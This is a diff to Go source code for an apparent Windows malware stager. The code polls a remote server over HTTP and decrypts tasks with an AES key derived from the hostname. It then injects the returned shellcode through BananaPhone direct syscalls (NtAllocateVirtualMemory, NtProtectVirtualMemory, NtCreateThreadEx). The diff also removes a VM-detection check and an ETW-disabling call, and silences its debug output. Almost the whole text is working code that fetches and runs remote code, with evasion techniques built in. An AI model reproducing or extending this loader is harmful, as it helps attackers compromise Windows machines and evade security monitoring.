@@ -1,3 +1,5 @@
+//go:build windows
+
 package main
 
 import (
@@ -7,7 +9,6 @@ import (
 	_ "embed"
 	b64 "encoding/base64"
 	"encoding/hex"
-	"fmt"
 	"golang.org/x/sys/windows"
 	"strconv"
 	"strings"
@@ -28,9 +29,6 @@ var (
 // https://github.com/C-Sto/BananaPhone
 
 func main() {
-	if malwareUtil.VmCheck() {
-		return
-	}
 	//get the shellcode by http
 	conf := strings.Split(t, ",")
 	sleepTime, _ = strconv.Atoi(conf[2])
@@ -50,27 +48,33 @@ func main() {
 			break
 		}
 	}
-	// if the response is not a shellcode, sleep and try again
 	for {
-		if len(body) > 10 {
-			break
-		}
-		t, _ := strconv.Atoi(string(body))
-		malwareUtil.Sleep(t)
 		body, err = malwareUtil.Request(cookieName, conf)
-		if err != nil || len(body) == 0 {
-			malwareUtil.Sleep(sleepTime)
+		// if the response is not a shellcode, sleep and try again
+		if len(body) < 10 {
+			t, _ := strconv.Atoi(string(body))
+			malwareUtil.Sleep(t)
+			if err != nil || len(body) == 0 {
+				malwareUtil.Sleep(sleepTime)
+			}
+		} else {
+			key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
+			hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
+			task, _ := malwareUtil.UnmarshalJSON(hexSc)
+			switch task.Tag {
+			case "shellcode":
+				shellcode, _ := hex.DecodeString(string(task.Payload))
+				//inject the shellcode
+				inject(shellcode)
+				return
+			case "sleep":
+				//fmt.Println("sleeping", string(task.Payload))
+				sleepTime, _ = strconv.Atoi(string(task.Payload))
+				malwareUtil.Sleep(sleepTime)
+			}
 		}
+		//fmt.Println(body)
 	}
-	key := cryptoUtil.GenerateKey(initChecks.GetHostname(), 32)
-	hexSc, _ := cryptoUtil.DecodeAES(body, []byte(key))
-	shellcode, _ := hex.DecodeString(string(hexSc))
-	//get the current process handle
-	handle := windows.CurrentProcess()
-	//disable etw for the current process
-	malwareUtil.EtwHell(uintptr(handle))
-	//inject the shellcode
-	inject(shellcode)
 }
 
 func inject(shellcode []byte) {
@@ -97,11 +101,10 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
 		windows.PAGE_READWRITE,
 	)
-	fmt.Println("Allocated memory at", baseA)
+	//fmt.Println("Allocated memory at", baseA)
 	//write memory
-	//bananaphone.WriteMemory(shellcode, baseA)
 	malwareUtil.Memcpy(baseA, shellcode)
-	fmt.Println("Wrote shellcode to memory")
+	//fmt.Println("Wrote shellcode to memory")
 	var oldprotect uintptr
 	bananaphone.Syscall(
 		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
@@ -111,7 +114,7 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		windows.PAGE_EXECUTE_READ,
 		uintptr(unsafe.Pointer(&oldprotect)),
 	)
-	fmt.Println("Changed memory protection to PAGE_EXECUTE_READ")
+	//fmt.Println("Changed memory protection to PAGE_EXECUTE_READ")
 	var hhosthread uintptr
 	bananaphone.Syscall(
 		NtCreateThreadExSysid,                //NtCreateThreadEx
@@ -127,6 +130,6 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		0,                                    //sizeofstackreserve
 		0,                                    //lpbytesbuffer
 	)
-	fmt.Println("Created thread at", hhosthread)
+	//fmt.Println("Created thread at", hhosthread)
 	bananaphone.Syscall(NtWaitForSingleObject, hhosthread, uintptr(0xffffffff), 0)
 }
